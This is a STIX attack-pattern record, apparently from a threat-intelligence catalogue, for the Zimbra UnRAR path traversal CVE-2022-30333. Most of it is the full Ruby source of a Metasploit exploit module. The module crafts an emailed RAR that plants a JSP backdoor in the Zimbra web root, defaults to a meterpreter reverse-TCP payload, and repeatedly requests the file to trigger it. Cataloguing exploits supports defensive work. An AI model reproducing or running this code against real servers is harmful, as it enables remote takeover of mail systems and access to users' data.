{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3526079c-9f2e-4c55-8faa-c58ea8d8397c",
    "created": "2024-08-14T17:01:21.264826Z",
    "modified": "2024-08-14T17:01:21.26483Z",
    "name": "UnRAR Path Traversal in Zimbra (CVE-2022-30333)",
    "description": " This module creates a RAR file that can be emailed to a Zimbra server",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zimbra_unrar_cve_2022_30333.rb",
            "external_id": "zimbra_unrar_cve_2022_30333.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-30333"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::RarSymlinkPathTraversal\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UnRAR Path Traversal in Zimbra (CVE-2022-30333)',\n        'Description' => %q{\n          This module creates a RAR file that can be emailed to a Zimbra server\n          to exploit CVE-2022-30333. If successful, it plants a JSP-based\n          backdoor in the public web directory, then executes that backdoor.\n\n          The core vulnerability is a path-traversal issue in unRAR that can\n          extract an arbitrary file to an arbitrary location on a Linux system.\n\n          This issue is exploitable on the following versions of Zimbra, provided\n          UnRAR version 6.11 or earlier is installed:\n\n          * Zimbra Collaboration 9.0.0 Patch 24 (and earlier)\n          * Zimbra Collaboration 8.8.15 Patch 31 (and earlier)\n        },\n        'Author' => [\n          'Simon Scannell', # Discovery / initial disclosure (via Sonar)\n          'Ron Bowes', # Analysis, PoC, and module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-30333'],\n          ['URL', 'https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/'],\n          ['URL', 'https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25'],\n          ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32'],\n          ['URL', 'https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis'],\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [ 'Zimbra Collaboration Suite', {} ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'TARGET_PATH' => '../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/',\n          'TARGET_FILENAME' => nil,\n          'DisablePayloadHandler' => false,\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Stance' => Msf::Exploit::Stance::Passive,\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-06-28',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'payload.rar']),\n\n        # Separating the path, filename, and extension allows us to randomize the filename\n        OptString.new('TARGET_PATH', [ true, 'The location the payload should extract to (can, and should, contain path traversal characters - \"../../\").']),\n        OptString.new('TARGET_FILENAME', [ false, 'The filename to write in the target directory; should have a .jsp extension (default: <random>.jsp).']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SYMLINK_FILENAME', [ false, 'The name of the symlink file to use (must be 12 characters or less; default: random)']),\n        OptBool.new('TRIGGER_PAYLOAD', [ false, 'If set, attempt to trigger the payload via an HTTP request.', true ]),\n\n        # Took this from multi/handler\n        OptInt.new('ListenerTimeout', [ false, 'The maximum number of seconds to wait for new sessions.', 0 ]),\n        OptInt.new('CheckInterval', [ true, 'The number of seconds to wait between each attempt to trigger the payload on the server.', 5 ])\n      ]\n    )\n  end\n\n  # Generate an on-system filename using datastore options\n  def generate_target_filename\n    if datastore['TARGET_FILENAME'] && !datastore['TARGET_FILENAME'].end_with?('.jsp')\n      print_warning('TARGET_FILENAME does not end with .jsp, was that intentional?')\n    end\n\n    File.join(datastore['TARGET_PATH'], datastore['TARGET_FILENAME'] || \"#{Rex::Text.rand_text_alpha_lower(4..10)}.jsp\")\n  end\n\n  # Normalize the path traversal and figure out where it is relative to the web root\n  def zimbra_get_public_path(target_filename)\n    # Normalize the path\n    normalized_path = Pathname.new(File.join('/opt/zimbra/data/amavisd/tmp', target_filename)).cleanpath\n\n    # Figure out where it is, relative to the webroot\n    webroot = Pathname.new('/opt/zimbra/jetty_base/webapps/zimbra/')\n    relative_path = normalized_path.relative_path_from(webroot)\n\n    # Hopefully, we found a path from the webroot to the payload!\n    if relative_path.to_s.start_with?('../')\n      return nil\n    end\n\n    relative_path\n  end\n\n  def exploit\n    print_status('Encoding the payload as a .jsp file')\n    payload = Msf::Util::EXE.to_jsp(generate_payload_exe)\n\n    # Create a file\n    target_filename = generate_target_filename\n    print_status(\"Target filename: #{target_filename}\")\n\n    # Sanity check - the file shouldn't exist, but we should be able to do requests to the server\n    if datastore['TRIGGER_PAYLOAD']\n      # Get the public path for triggering the vulnerability, terminate if we\n      # can't figure it out\n      public_filename = zimbra_get_public_path(target_filename)\n      if public_filename.nil?\n        fail_with(Failure::Unknown, 'Could not determine the public web path')\n      end\n\n      print_status('Checking the HTTP connection to the target')\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(public_filename)\n      )\n\n      unless res\n        fail_with(Failure::Unknown, 'Could not connect to the server via HTTP (disable TRIGGER_PAYLOAD if you plan to trigger it manually)')\n      end\n\n      # Break when the file successfully appears\n      unless res.code == 404\n        fail_with(Failure::Unknown, \"Server returned an unexpected result when we attempted to trigger our payload (expected HTTP/404, got HTTP/#{res.code}\")\n      end\n    end\n\n    begin\n      rar = encode_as_traversal_rar(datastore['SYMLINK_FILENAME'] || Rex::Text.rand_text_alpha_lower(4..12), target_filename, payload)\n    rescue StandardError => e\n      fail_with(Failure::BadConfig, \"Failed to encode RAR file: #{e}\")\n    end\n\n    file_create(rar)\n\n    print_good('File created! Email the file above to any user on the target Zimbra server')\n\n    # Bail if they don't want the payload triggered\n    return unless datastore['TRIGGER_PAYLOAD']\n\n    register_file_for_cleanup(target_filename)\n\n    interval = datastore['CheckInterval'].to_i\n    print_status(\"Trying to trigger the backdoor @ #{public_filename} every #{interval}s [backgrounding]...\")\n\n    # This loop is mostly from `multi/handler`\n    stime = Process.clock_gettime(Process::CLOCK_MONOTONIC).to_i\n    timeout = datastore['ListenerTimeout'].to_i\n\n    # We flip this once we trigger the payload\n    keep_sending = true\n    loop do\n      break if session_created?\n      break if timeout > 0 && (stime + timeout < Process.clock_gettime(Process::CLOCK_MONOTONIC).to_i)\n\n      # Once we've triggered the payload, stop trying to\n      if keep_sending\n        res = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(public_filename)\n        )\n\n        unless res\n          fail_with(Failure::Unknown, 'Could not connect to the server to trigger the payload')\n        end\n\n        # Break when the file successfully appears\n        if res.code == 200\n          print_good('Successfully triggered the payload')\n          keep_sending = false\n          next\n        end\n      end\n\n      Rex::ThreadSafe.sleep(interval)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}